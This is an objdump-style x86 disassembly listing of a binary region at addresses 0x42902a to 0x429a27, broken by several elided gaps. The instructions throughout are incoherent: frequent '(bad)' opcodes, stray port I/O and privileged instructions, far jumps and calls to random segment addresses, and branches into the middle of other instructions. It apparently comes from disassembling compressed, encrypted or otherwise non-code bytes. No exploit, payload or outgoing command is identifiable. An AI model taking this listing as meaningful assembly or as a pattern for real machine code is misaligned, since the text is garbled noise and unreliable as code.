  42902a:	pop    es
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    ch,cl
  42902f:	out    0xf3,eax
  429031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429032:	mov    DWORD PTR [ecx-0x5695694a],ebp
  429038:	lock stos BYTE PTR es:[edi],al
  42903a:	or     BYTE PTR [esi+0x6aabc6da],0xc1
  429041:	aad    0x31
  429043:	jb     0x42908e
  429045:	mov    bh,0x1a
  429047:	cli    
  429048:	mov    WORD PTR [eax],gs
  42904a:	(bad)
  42904f:	xor    eax,0x97b177e
  429054:	imul   edi,DWORD PTR [esi+0x2a],0xf44bbf0
  42905b:	and    al,0x6e
  42905d:	push   edi
  42905e:	xchg   edi,eax
  42905f:	pushf  
  429060:	scas   al,BYTE PTR es:[edi]
  429061:	pop    edx
  429062:	dec    ecx
  429063:	mov    esi,0x1d076031
  429068:	cwde   
  429069:	test   BYTE PTR [ecx],bh
  42906b:	clc    
  42906c:	jmp    0x429055
  42906e:	jmp    0x2904774d
  429073:	add    al,0x54
  429075:	pop    DWORD PTR [ecx]
  429077:	mov    edi,0xab0d91b1
  42907c:	rcr    DWORD PTR [ebx+esi*2+0x41bf57f5],cl
  429083:	xor    BYTE PTR ds:0x1cff7bb8,bh
  429089:	scas   eax,DWORD PTR es:[edi]
  42908a:	jl     0x42906f
  42908c:	les    edx,FWORD PTR [esi-0x2e]
  42908f:	push   ss
  429090:	retf   
  429091:	test   al,0xae
  429093:	lods   al,BYTE PTR ds:[esi]
  429094:	xchg   ecx,eax
  429095:	scas   al,BYTE PTR es:[edi]
  429096:	fwait
  429097:	dec    ecx
  429098:	jecxz  0x4290e9
  42909a:	jne    0x429039
  42909c:	aas    
  42909d:	pop    edx
  42909e:	sbb    BYTE PTR [eax],bl
  4290a0:	les    ebx,FWORD PTR [edx-0x4522be86]
  4290a6:	xchg   esp,eax
  4290a7:	or     eax,0x611d3329
  4290ac:	or     DWORD PTR [edx],ecx
  4290ae:	ror    DWORD PTR [esi-0xb],cl
  4290b1:	jo     0x429056
  4290b3:	addr16 mov ds:0xec42,al
  4290b7:	inc    edi
  4290b8:	fwait
  4290b9:	mov    edx,0x6931a7f4
  4290be:	popa   
  4290bf:	jp     0x42908f
  4290c1:	or     al,0xe8
  4290c3:	mov    dh,0xd4
  4290c5:	inc    esi
  4290c6:	out    0xa0,eax
  4290c8:	loop   0x429105
  4290ca:	push   ss
  4290cb:	repnz push ebx
  4290cd:	add    BYTE PTR [esp+eax*2-0x23232238],0x63
  4290d5:	sub    eax,0x87f93e18
  4290da:	fxch   st(1)
  4290dc:	gs inc edx
  4290de:	cmp    esi,edi
  4290e0:	push   esi
  4290e1:	jle    0x429109
  4290e3:	jp     0x429111
  4290e5:	retf   
  4290e6:	mov    ch,0x3a
  4290e8:	ins    DWORD PTR es:[edi],dx
  4290e9:	push   cx
  4290eb:	jmp    0x91e8:0x845fe947
  4290f2:	popf   
  4290f3:	sub    dh,BYTE PTR [eax-0x59]
  4290f6:	xchg   edx,eax
  4290f7:	mov    esi,0xb3493599
  4290fc:	xor    edx,edx
  4290fe:	stc    
  4290ff:	sbb    ch,BYTE PTR [ecx-0x26]
  429102:	xchg   esi,eax
  429103:	pop    ebp
  429104:	xchg   ebp,eax
  429105:	jnp    0x4290ec
  429107:	sub    edi,DWORD PTR [edi+0x1c]
  42910a:	test   eax,0xfc45fa73
  42910f:	sahf   
  429110:	outs   dx,BYTE PTR ds:[esi]
  429111:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429112:	je     0x42911a
  429114:	fbstp  TBYTE PTR [ebx]
  429116:	enter  0x2581,0x2d
  42911a:	int    0x48
  42911c:	adc    ah,0xa2
  42911f:	dec    edx
  429120:	dec    esp
  429121:	test   al,0x96
  429123:	jo     0x429174
  429125:	jmp    0x429119
  429127:	hlt    
  429128:	lock or eax,DWORD PTR [ebx-0x4694736c]
  42912f:	repz jne 0x429152
  429132:	aam    0xc9
  429134:	pop    DWORD PTR [eax]
	...
  429196:	push   esi
  429197:	xchg   ebp,edi
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	xor    ebp,DWORD PTR [esp+ecx*4]
  4291a5:	call   0x107:0x1b71b
  4291ac:	add    BYTE PTR [eax],al
  4291ae:	or     BYTE PTR [edx-0x3e],dl
  4291b1:	and    al,0x70
  4291b3:	test   al,0x5c
  4291b5:	sub    eax,0x9df739b4
  4291ba:	jne    0x429171
  4291bc:	pop    es
  4291bd:	inc    eax
  4291be:	sub    cl,0x8b
  4291c1:	dec    edi
  4291c2:	retf   
  4291c3:	out    0x5b,eax
  4291c5:	push   ss
  4291c6:	push   0xfffffffe
  4291c8:	push   ds
  4291c9:	inc    ebx
  4291ca:	inc    esi
  4291cb:	xor    eax,0xf108ba31
  4291d0:	out    dx,eax
  4291d1:	xor    BYTE PTR [ebx],dl
  4291d3:	rdpmc  
  4291d5:	test   BYTE PTR [ecx-0x2],0x9d
  4291d9:	cld    
  4291da:	rol    BYTE PTR [edx+0x36],1
  4291dd:	int    0x54
  4291df:	inc    edi
  4291e0:	lods   eax,DWORD PTR ds:[esi]
  4291e2:	dec    edx
  4291e3:	and    bl,al
  4291e5:	(bad)  
  4291e6:	add    al,ah
  4291e8:	fist   DWORD PTR [ebp-0x34700f9b]
  4291ee:	dec    esi
  4291ef:	in     al,dx
  4291f0:	cmp    DWORD PTR [esi],edx
  4291f2:	fs or  eax,0xc26843c9
  4291f8:	(bad)  
  4291fa:	das    
  4291fb:	shl    DWORD PTR [edx-0x4],0xc4
  4291ff:	dec    ebp
  429200:	inc    ecx
  429201:	mov    dl,0x41
  429203:	adc    esi,DWORD PTR [esp+edx*2-0x7b20edac]
  42920a:	ja     0x429236
  42920c:	mov    esp,0x82aaaed2
  429211:	sbb    bl,BYTE PTR [bx+si+0x6f]
  429215:	sub    ebp,DWORD PTR [edx]
  429217:	mov    edx,0x695b3695
  42921c:	cmp    edx,edx
  42921e:	push   ss
  42921f:	mov    ds:0xa90c345d,eax
  429224:	push   ebx
  429225:	icebp  
  429226:	ja     0x4291cc
  429228:	fidiv  WORD PTR [ebx+0x49]
  42922b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42922c:	cmp    eax,0xdce29608
  429231:	add    BYTE PTR [esi+edi*1],bl
  429234:	ins    BYTE PTR es:[edi],dx
  429235:	inc    esp
  429236:	je     0x429236
  429238:	mov    dh,0x72
  42923a:	fld    TBYTE PTR [ebx+eax*2-0x6e]
  42923e:	mov    BYTE PTR [ecx+0x21],bl
  429241:	push   es
  429242:	out    dx,al
  429243:	std    
  429244:	cmp    DWORD PTR [edi],ecx
  429246:	mov    dh,0xaa
  429248:	into   
  429249:	int    0xf3
  42924b:	push   es
  42924c:	push   ebp
  42924d:	add    al,0x1b
  42924f:	(bad)
  429253:	push   ecx
  429254:	(bad)  
  429255:	movd   mm7,DWORD PTR [ecx]
  429258:	xchg   esp,eax
  429259:	ins    DWORD PTR es:[edi],dx
  42925a:	fisubr WORD PTR [edi+0x3cbe9d0a]
  429260:	xchg   ebp,eax
  429261:	repnz and BYTE PTR [edi-0x72],0xef
  429266:	in     al,dx
  429267:	sub    eax,0x66520e01
  42926c:	stos   BYTE PTR es:[edi],al
  42926d:	push   0x1af29e0e
  429272:	loope  0x429217
  429274:	aas    
  429275:	aad    0x93
  429277:	pop    esp
  429278:	ret    
  429279:	cs pop ebp
  42927b:	add    DWORD PTR [ecx-0x10],edi
  42927e:	fsubr  st(6),st
  429280:	shl    DWORD PTR [edx+0x361ca85a],cl
  429286:	inc    DWORD PTR [eax+eiz*8]
  429289:	inc    edi
  42928a:	bound  eax,QWORD PTR [edi-0x4f898fce]
  429290:	mov    esi,0xebeda47
  429295:	xor    al,0xef
  429297:	test   BYTE PTR ds:0xcbdc9968,dh
  42929d:	cmc    
  42929e:	jb     0x4292e5
  4292a0:	jmp    0x4292c2
  4292a2:	pop    esi
  4292a3:	aam    0xf5
  4292a5:	or     eax,0xf186a57b
  4292aa:	(bad)  
  4292ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292ac:	inc    edi
  4292ad:	mov    al,0x9
  4292af:	sub    dl,BYTE PTR [ecx-0x4c]
  4292b2:	nop
  4292b3:	dec    ecx
  4292b4:	adc    DWORD PTR [eax],eax
	...
  429316:	lock adc al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs dec edx
  429323:	int    0xb
  429325:	sbb    eax,0x1b822
  42932a:	pop    es
  42932b:	add    DWORD PTR [eax],eax
  42932d:	add    BYTE PTR [eax-0x4e71dacb],ch
  429333:	outs   dx,DWORD PTR ds:[esi]
  429334:	div    DWORD PTR [edx*8-0x5380a90]
  42933b:	jnp    0x4292d9
  42933d:	hlt    
  42933e:	jp     0x4292c4
  429340:	mov    cl,0xd7
  429342:	(bad)  
  429343:	sub    esp,ebx
  429345:	cmp    eax,0xe27d464
  42934a:	fldenv [eax]
  42934c:	and    DWORD PTR [esi],eax
  42934e:	or     esp,edi
  429350:	and    eax,0xe22d40f5
  429355:	and    al,0xdd
  429357:	aam    0x5a
  429359:	xor    DWORD PTR [ecx-0x11],esp
  42935c:	dec    esi
  42935d:	jbe    0x429376
  42935f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429360:	mov    eax,0x16950509
  429365:	push   eax
  429366:	sti    
  429367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429368:	test   eax,0xc1e135d3
  42936d:	(bad)  
  42936e:	ds leave 
  429370:	arpl   WORD PTR [edi],di
  429372:	mov    cl,0xc6
  429374:	add    BYTE PTR [ebx],0x6
  429377:	inc    esi
  429378:	sub    cl,BYTE PTR [eax+0x3cc259df]
  42937e:	outs   dx,BYTE PTR ds:[esi]
  42937f:	and    al,0x4
  429381:	xchg   esi,eax
  429382:	jge    0x429355
  429384:	stc    
  429385:	mov    ebx,0xc49df0a0
  42938a:	or     ecx,edx
  42938c:	jne    0x4293ae
  42938e:	adc    BYTE PTR [ebx-0x6a],bl
  429391:	xchg   esp,eax
  429392:	shl    edi,0xc0
  429395:	cmp    edx,ebp
  429397:	lock ins BYTE PTR es:[edi],dx
  429399:	xor    eax,0x95a6f311
  42939e:	or     DWORD PTR [esi-0x31b41914],edx
  4293a4:	sbb    ecx,ecx
  4293a6:	adc    dh,BYTE PTR [edi+ecx*4]
  4293a9:	icebp  
  4293aa:	aad    0x59
  4293ac:	adc    ebp,edx
  4293ae:	scas   eax,DWORD PTR es:[edi]
  4293af:	out    0xae,al
  4293b1:	lods   eax,DWORD PTR ds:[esi]
  4293b2:	jae    0x4293df
  4293b4:	mov    eax,0xa92f5216
  4293b9:	sub    al,0x8d
  4293bb:	sub    esi,edi
  4293bd:	add    BYTE PTR [eax+0x21],0x99
  4293c1:	mov    edx,0x51931c18
  4293c6:	dec    ecx
  4293c7:	xchg   esp,eax
  4293c8:	sti    
  4293c9:	das    
  4293ca:	push   eax
  4293cb:	test   eax,0xb4a0636c
  4293d0:	arpl   WORD PTR [eax],bp
  4293d2:	cdq    
  4293d3:	mov    bh,0x76
  4293d5:	mov    WORD PTR [eax],gs
  4293d7:	cmp    al,0x7d
  4293d9:	aad    0xa4
  4293db:	fild   WORD PTR [ecx+esi*8]
  4293de:	cli    
  4293df:	sub    esi,DWORD PTR [edi+edx*4+0x40377494]
  4293e6:	mov    WORD PTR [esi+0x7b3dfed1],ss
  4293ec:	inc    eax
  4293ed:	rcl    DWORD PTR [edi+0x4c],1
  4293f0:	(bad)  
  4293f1:	push   ebp
  4293f2:	popa   
  4293f3:	into   
  4293f4:	ins    DWORD PTR es:[edi],dx
  4293f5:	mov    ds:0xc4ce0afb,al
  4293fa:	(bad)  
  4293fb:	ins    BYTE PTR es:[edi],dx
  4293fc:	lods   al,BYTE PTR ds:[esi]
  4293fd:	xchg   ebx,eax
  4293fe:	icebp  
  4293ff:	or     ecx,0x4b
  429402:	pop    esp
  429403:	jnp    0x429440
  429405:	dec    edx
  429406:	xor    al,0x6e
  429408:	bound  esi,QWORD PTR [edi]
  42940a:	dec    edi
  42940b:	out    0xbc,eax
  42940d:	cmp    DWORD PTR [ecx-0x1d246b81],ecx
  429413:	mul    BYTE PTR [edi+0x45]
  429416:	loop   0x429491
  429418:	out    dx,al
  429419:	scas   eax,DWORD PTR es:[edi]
  42941a:	cmp    esp,DWORD PTR [esi+0x391162f3]
  429420:	loope  0x4293c5
  429422:	push   0x70
  429424:	inc    esp
  429425:	aaa    
  429426:	sbb    ah,BYTE PTR [ebp-0x5d]
  429429:	jmp    0x66f0:0xb0ba4568
  429430:	mov    DWORD PTR [esi+0x16],esp
  429433:	ja     0x429485
	...
  429495:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429499:	sub    al,0x53
  42949b:	ds jg  0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	adc    eax,0x29bbd1f7
  4294a7:	mov    ecx,0x1070001
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	sub    BYTE PTR [ebx],ch
  4294b0:	mov    BYTE PTR [ecx-0x61],0xc0
  4294b4:	and    BYTE PTR [ebx+edi*2],dh
  4294b7:	out    dx,al
  4294b8:	call   0x21c4d12c
  4294bd:	cmc    
  4294be:	dec    esp
  4294bf:	(bad)  
  4294c0:	bswap  edi
  4294c2:	inc    esi
  4294c3:	cmc    
  4294c4:	and    DWORD PTR [ebp+edi*4+0x41],ebp
  4294c8:	(bad)  [eax]
  4294ca:	popa   
  4294cb:	sub    eax,0xb272beed
  4294d0:	imul   ebp,DWORD PTR [ebp-0x7b],0xffffffb0
  4294d4:	inc    ecx
  4294d5:	pop    edx
  4294d6:	repnz cld 
  4294d8:	sub    DWORD PTR [ebx+ecx*2-0x5],0x7fe79ba8
  4294e0:	jg     0x4294e1
  4294e2:	mov    esi,0x95201d49
  4294e7:	ja     0x42948b
  4294e9:	pushf  
  4294ea:	rcl    DWORD PTR [ebx+0x7897ea89],cl
  4294f0:	ucomiss xmm1,xmm2
  4294f3:	std    
  4294f4:	pop    ss
  4294f5:	push   esi
  4294f6:	shr    DWORD PTR [edi+0x4a],cl
  4294f9:	fcomp  QWORD PTR [eax+0x46]
  4294fc:	pushf  
  4294fd:	mov    edi,0x88295e1b
  429502:	adc    al,0xe8
  429504:	iret   
  429505:	jmp    0xfb2c:0xcc24c4ae
  42950c:	outs   dx,DWORD PTR ds:[esi]
  42950d:	fs xchg edi,eax
  42950f:	pop    ss
  429510:	sbb    dl,BYTE PTR [ebx]
  429512:	(bad)  
  429513:	jl     0x4294f4
  429515:	fcmovb st,st(2)
  429517:	lock and BYTE PTR [edi],0x22
  42951b:	lahf   
  42951c:	addr16 ss clc 
  42951f:	cli    
  429520:	sbb    ebx,DWORD PTR [eax]
  429522:	jae    0x4294a5
  429524:	add    bh,BYTE PTR [ecx+0xb5be6a1]
  42952a:	pop    es
  42952b:	sub    al,0xdc
  42952d:	sub    BYTE PTR [eax],ch
  42952f:	mov    ds,WORD PTR [edi-0x3bb0967f]
  429535:	push   ecx
  429536:	bound  ecx,QWORD PTR [ecx-0x30]
  429539:	xchg   DWORD PTR [ebx],ebx
  42953b:	call   0xf18a:0xf2133791
  429542:	into   
  429543:	(bad)  
  429544:	jne    0x429575
  429546:	(bad)  
  429547:	mov    ebp,0x3bad65eb
  42954c:	out    0xb2,al
  42954e:	mov    ecx,DWORD PTR [edx]
  429550:	xor    ecx,DWORD PTR [ebx-0x6f]
  429553:	adc    DWORD PTR [esi],esi
  429555:	push   es
  429556:	sbb    al,0x2
  429558:	mov    al,al
  42955a:	adc    BYTE PTR [edi-0x2e180fb],al
  429560:	add    ebx,DWORD PTR [edi]
  429562:	ins    DWORD PTR es:[edi],dx
  429563:	int    0x2a
  429565:	scas   al,BYTE PTR es:[edi]
  429566:	retf   
  429567:	aas    
  429568:	in     al,dx
  429569:	pushf  
  42956a:	repz call 0x584a:0xc473eaa0
  429572:	ins    BYTE PTR es:[edi],dx
  429573:	cmp    dl,BYTE PTR [ebx-0x44]
  429576:	icebp  
  429577:	sbb    DWORD PTR [ecx-0x695a8d54],edi
  42957d:	in     al,0xc4
  42957f:	xlat   BYTE PTR ds:[ebx]
  429580:	cmp    eax,DWORD PTR [edx]
  429582:	sbb    eax,0xb574b77e
  429587:	or     DWORD PTR [ebx+eiz*8+0x51688c4f],esp
  42958e:	sub    eax,0x25b20548
  429593:	pop    edx
  429594:	push   ebp
  429595:	inc    esp
  429596:	pop    eax
  429597:	cli    
  429598:	sbb    bh,BYTE PTR [edi]
  42959a:	cmp    DWORD PTR [esi+0x503d034d],edx
  4295a0:	and    al,0x23
  4295a2:	pop    esi
  4295a3:	xor    dl,0x9d
  4295a6:	push   0x6f4fa38f
  4295ab:	sub    eax,0xb79741b9
  4295b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295b2:	sub    ebx,DWORD PTR [ebp+0x21]
	...
  429614:	add    BYTE PTR [eax],al
  429616:	ins    DWORD PTR es:[edi],dx
  429617:	sbb    eax,0xfbf6c0e6
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	rcr    DWORD PTR [edi-0x79],1
  429625:	xchg   edi,eax
  429626:	xor    BYTE PTR [edx+0x1070001],bh
  42962c:	add    BYTE PTR [eax],al
  42962e:	dec    edx
  42962f:	sbb    al,0x4a
  429631:	mov    BYTE PTR [esi+0x66a0c0e9],al
  429637:	sub    BYTE PTR [esi],al
  429639:	push   eax
  42963a:	jmp    0xfbb6:0x604603aa
  429641:	jnp    0x4295da
  429643:	push   esp
  429644:	(bad)  
  429645:	repnz push bx
  429648:	jp     0x4295fa
  42964a:	add    DWORD PTR [ecx-0x44],ebp
  42964d:	into   
  42964e:	ret    
  42964f:	sub    ebp,edi
  429651:	mov    bl,0x51
  429653:	add    ecx,0xeb606ae1
  429659:	hlt    
  42965a:	cmc    
  42965b:	js     0x42964f
  42965d:	mov    ah,0x26
  42965f:	fmul   st(6),st
  429661:	out    0x85,al
  429663:	rol    BYTE PTR [ecx+ebx*8+0x103bf557],0x80
  42966b:	pop    esi
  42966c:	adc    ebx,eax
  42966e:	mov    ds:0x61c19ba7,eax
  429673:	scas   eax,DWORD PTR es:[edi]
  429674:	mov    dl,0xba
  429676:	sbb    DWORD PTR [eax],ebp
  429678:	pop    edi
  429679:	inc    edx
  42967a:	je     0x4296dc
  42967c:	loope  0x429691
  42967e:	and    BYTE PTR [edx+edx*4-0x7f],0x0
  429683:	mov    dh,0x3c
  429685:	imul   edi,DWORD PTR [ebx-0x56a5f7a7],0x2e
  42968c:	mul    DWORD PTR [edi]
  42968e:	fdivr  st,st(5)
  429690:	dec    esi
  429691:	xor    eax,esp
  429693:	push   esi
  429694:	and    al,0xe8
  429696:	dec    eax
  429697:	fistp  WORD PTR [ebp+0x74]
  42969a:	mov    edx,0xff8763f4
  42969f:	(bad)  
  4296a0:	mov    gs,WORD PTR [ecx]
  4296a2:	iret   
  4296a3:	ins    BYTE PTR es:[edi],dx
  4296a4:	sti    
  4296a5:	xchg   esp,eax
  4296a6:	or     eax,0x83b39f00
  4296ab:	or     al,0xe6
  4296ad:	inc    ecx
  4296ae:	ins    DWORD PTR es:[edi],dx
  4296af:	jbe    0x429726
  4296b1:	bound  ebx,QWORD PTR [eax+0x16d04f81]
  4296b7:	xchg   edi,eax
  4296b8:	mov    dl,0x60
  4296ba:	out    0x11,eax
  4296bc:	add    ebp,DWORD PTR [ebx+0x18]
  4296bf:	test   DWORD PTR [esi-0x55],0x2660c73c
  4296c6:	out    0x28,al
  4296c8:	jp     0x429688
  4296ca:	mov    eax,0xa6a6e78c
  4296cf:	das    
  4296d0:	add    al,0x56
  4296d2:	sbb    eax,ebx
  4296d4:	or     BYTE PTR [ecx],0x1e
  4296d7:	out    dx,al
  4296d8:	xor    edi,DWORD PTR [edi-0x6e7c4b4f]
  4296de:	ss dec eax
  4296e0:	ret    0x9751
  4296e3:	(bad)  
  4296e4:	jo     0x42970d
  4296e6:	das    
  4296e7:	mov    dl,BYTE PTR [ecx-0x63]
  4296ea:	pushw  0x76
  4296ed:	jecxz  0x4296be
  4296ef:	(bad)  
  4296f0:	std    
  4296f1:	jmp    0xbd61:0x6e63f366
  4296f8:	ror    BYTE PTR [eax-0x1a745444],1
  4296fe:	jmp    0x24c87400
  429703:	and    ecx,DWORD PTR [esi]
  429705:	dec    esi
  429706:	les    esi,FWORD PTR [ebx]
  429708:	mov    ah,0x17
  42970a:	je     0x429759
  42970c:	scas   al,BYTE PTR es:[edi]
  42970d:	sub    al,0x8c
  42970f:	xor    dl,BYTE PTR [eax+0x41]
  429712:	fsubp  st(1),st
  429714:	cmp    DWORD PTR [ecx-0x6e436fea],esi
  42971a:	(bad)  [edi-0x5e]
  42971d:	sbb    al,0x27
  42971f:	call   0x613a:0x98e33860
  429726:	xlat   BYTE PTR ds:[ebx]
  429727:	or     esi,DWORD PTR [edx-0x36]
  42972a:	xchg   esi,eax
  42972b:	jne    0x42977c
  42972d:	ja     0x429743
  42972f:	popf   
  429730:	adc    al,0xf1
  429732:	dec    eax
  429733:	jl     0x42979b
	...
  429795:	add    BYTE PTR [eax],dh
  429797:	inc    edx
  429798:	fbld   TBYTE PTR [edx-0x1]
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	(bad)  
  4297a2:	(bad)  
  4297a4:	js     0x429808
  4297a6:	aaa    
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	sbb    al,BYTE PTR ds:0x481cb0b3
  4297b4:	sub    esp,DWORD PTR ds:0x9ff62ac0
  4297ba:	(bad)  
  4297bb:	jl     0x4297e9
  4297bd:	fistp  DWORD PTR [edx]
  4297bf:	push   ecx
  4297c0:	aas    
  4297c1:	add    eax,0x5c079d84
  4297c6:	push   es
  4297c7:	lahf   
  4297c8:	out    dx,eax
  4297c9:	xchg   ebp,eax
  4297ca:	pop    ebp
  4297cb:	stc    
  4297cc:	mov    gs:0x4c9582fc,eax
  4297d2:	xor    cl,dl
  4297d4:	cdq    
  4297d5:	mov    dl,0x51
  4297d7:	stos   DWORD PTR es:[edi],eax
  4297d8:	inc    edx
  4297d9:	cwde   
  4297da:	push   edi
  4297db:	xchg   BYTE PTR [ebx+0x1d],al
  4297de:	scas   al,BYTE PTR es:[edi]
  4297df:	imul   BYTE PTR [eax+0x22]
  4297e2:	lds    edi,FWORD PTR [ebx+0x1acc57b3]
  4297e8:	mov    ch,0x67
  4297ea:	push   0x54
  4297ec:	and    al,0x3
  4297ee:	push   ebp
  4297ef:	imul   ebp,DWORD PTR [esi-0xa5bf79d],0x7ecf8759
  4297f9:	sub    BYTE PTR [ecx-0x4cf8891d],dl
  4297ff:	in     al,0x32
  429801:	icebp  
  429802:	int3   
  429803:	and    ebx,edi
  429805:	mov    ds:0x1f2ab3fd,eax
  42980a:	mov    ecx,0x7287a03e
  42980f:	aam    0xd2
  429811:	les    ecx,FWORD PTR [edx+0x54]
  429814:	cli    
  429815:	rol    ecx,cl
  429817:	cmp    al,0xea
  429819:	jle    0x42982c
  42981b:	jne    0x429860
  42981d:	test   BYTE PTR [esi],al
  42981f:	call   0x1eff8d13
  429824:	das    
  429825:	lds    esp,FWORD PTR [ebx-0xedf3085]
  42982b:	aam    0x7a
  42982d:	aad    0xf6
  42982f:	dec    edi
  429830:	xor    edx,esp
  429832:	add    BYTE PTR [ecx],bh
  429834:	jg     0x4297d9
  429836:	aaa    
  429837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429838:	and    eax,ecx
  42983a:	clc    
  42983b:	jecxz  0x4298b7
  42983d:	lods   al,BYTE PTR ds:[esi]
  42983e:	mov    ah,0xf3
  429840:	push   esp
  429841:	retf   0x5581
  429844:	lahf   
  429845:	jb     0x4297fb
  429847:	mov    esp,0x424bad2a
  42984c:	pop    es
  42984d:	dec    DWORD PTR [ebx+0x3dfe0659]
  429853:	adc    BYTE PTR [edx+0x7b],bl
  429856:	jle    0x4298ac
  429858:	bnd jb 0x4297dc
  42985b:	adc    al,BYTE PTR [esi-0x799ef4a4]
  429861:	push   ecx
  429862:	sbb    dh,BYTE PTR [ebp-0xc]
  429865:	mov    DWORD PTR [ebx-0x79b0c1b1],ecx
  42986b:	test   DWORD PTR [ecx],ebp
  42986d:	icebp  
  42986e:	sar    DWORD PTR [esp+edx*4+0x3f],1
  429872:	aaa    
  429873:	add    dh,BYTE PTR [ecx+ebp*8+0x5a66ad43]
  42987a:	adc    al,0x64
  42987c:	jno    0x4298df
  42987e:	jmp    0x6c4a:0x336b4f0b
  429885:	std    
  429886:	retf   
  429887:	popf   
  429888:	les    edi,FWORD PTR [edx-0x5bacaffe]
  42988e:	or     al,0x48
  429890:	add    esi,esi
  429892:	or     eax,0x236048
  429897:	jg     0x4298e7
  429899:	cmp    BYTE PTR [ebp+esi*4-0x3b],bh
  42989d:	enter  0xb8b3,0x73
  4298a1:	and    DWORD PTR [edx-0x2fc35b9f],ebx
  4298a7:	push   ds
  4298a8:	in     eax,dx
  4298a9:	icebp  
  4298aa:	add    DWORD PTR [edx],ebp
  4298ac:	inc    ebx
  4298ad:	repnz sbb DWORD PTR [ebx+0x38076f55],0x4c
	...
  429914:	add    BYTE PTR [eax],al
  429916:	push   edi
  429917:	push   0xdf7fdf64
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	inc    edi
  429923:	or     DWORD PTR [ebx+0x1bc3ed3],0x0
  42992a:	pop    es
  42992b:	add    DWORD PTR [eax],eax
  42992d:	add    BYTE PTR [ecx],al
  42992f:	push   esi
  429930:	add    BYTE PTR [edi+0x2b30f2fd],bl
  429936:	sbb    eax,0xfa5e6a17
  42993b:	pop    esp
  42993c:	add    eax,0xf0f03ec1
  429941:	add    dh,ch
  429943:	fnsave [edi+0x21e67b0]
  429949:	sbb    DWORD PTR [edx-0x517165ad],ebp
  42994f:	pop    ebx
  429950:	rcr    DWORD PTR [ebx-0x9],0x98
  429954:	(bad)  
  429955:	or     al,0xf0
  429957:	aam    0x4e
  429959:	cmp    cl,cl
  42995b:	adc    ebx,DWORD PTR [eax-0x242394b4]
  429961:	push   edx
  429962:	jmp    0x8add:0xf50c7083
  429969:	mov    eax,ds:0x2b076d7d
  42996e:	rcl    BYTE PTR [ebp+0x3c],0xc1
  429972:	inc    edx
  429973:	sbb    DWORD PTR [edi+edi*8+0x33],eax
  429977:	je     0x42994a
  429979:	mov    ds:0xbb8e03e6,al
  42997e:	cli    
  42997f:	mov    esi,0xefab91c7
  429984:	(bad)  
  429985:	fdiv   QWORD PTR [edx-0x510b6e96]
  42998b:	mov    esi,0x393b397a
  429990:	test   eax,0xdaf54095
  429995:	popa   
  429996:	enter  0x7412,0x77
  42999a:	lds    eax,FWORD PTR [edx+0x3d]
  42999d:	into   
  42999e:	dec    ecx
  42999f:	or     al,0x97
  4299a1:	push   es
  4299a2:	sub    DWORD PTR [esi],ebp
  4299a4:	lods   al,BYTE PTR ds:[esi]
  4299a5:	dec    esi
  4299a6:	pop    edi
  4299a7:	pop    edi
  4299a8:	and    dl,ah
  4299aa:	push   eax
  4299ab:	(bad)  
  4299ac:	cli    
  4299ad:	xchg   edx,eax
  4299ae:	xor    bl,cl
  4299b0:	inc    ebx
  4299b1:	push   0xffffffdd
  4299b3:	jg     0x429a1e
  4299b5:	and    edx,eax
  4299b7:	out    dx,eax
  4299b8:	std    
  4299b9:	push   ebp
  4299ba:	dec    edi
  4299bb:	and    edx,DWORD PTR [edx]
  4299bd:	dec    esi
  4299be:	aaa    
  4299bf:	lds    esi,FWORD PTR [eax+0x3]
  4299c2:	gs sub al,0x1f
  4299c5:	mov    cx,cx
  4299c8:	push   edx
  4299c9:	xchg   ebx,eax
  4299ca:	mov    DWORD PTR [edi+0x34ae260a],edx
  4299d0:	bswap  edx
  4299d2:	int3   
  4299d3:	clc    
  4299d4:	push   edi
  4299d5:	test   al,0xc8
  4299d7:	out    0x3c,eax
  4299d9:	pop    es
  4299da:	sahf   
  4299db:	je     0x429a28
  4299dd:	sti    
  4299de:	mov    edi,0xa19dc54
  4299e3:	dec    ebp
  4299e4:	adc    BYTE PTR [ebp+0xb],0x13
  4299e8:	lods   eax,DWORD PTR ds:[esi]
  4299e9:	mov    bl,0x50
  4299eb:	aad    0x1
  4299ed:	lods   al,BYTE PTR ds:[esi]
  4299ee:	and    BYTE PTR [ebx-0x149b6e4c],ch
  4299f4:	pop    edx
  4299f5:	inc    esi
  4299f6:	jbe    0x429a42
  4299f8:	inc    ebp
  4299f9:	aaa    
  4299fa:	rcr    DWORD PTR [eax+ebp*8-0x11887525],cl
  429a01:	test   eax,0xa9f58ca4
  429a06:	je     0x4299f4
  429a08:	add    al,0x30
  429a0a:	scas   eax,DWORD PTR es:[edi]
  429a0b:	fsub   DWORD PTR [edx-0x69]
  429a0e:	stc    
  429a0f:	inc    eax
  429a10:	xchg   BYTE PTR [eax+0x74],bh
  429a13:	call   0xf2ce:0x7856ed0b
  429a1a:	add    dl,cl
  429a1c:	(bad)  
  429a1d:	xlat   BYTE PTR ds:[ebx]
  429a1e:	mov    DWORD PTR [eax+0x48],ecx
  429a21:	cmp    DWORD PTR [ebp-0x2b711748],edi
  429a27:	mov    al,0x84
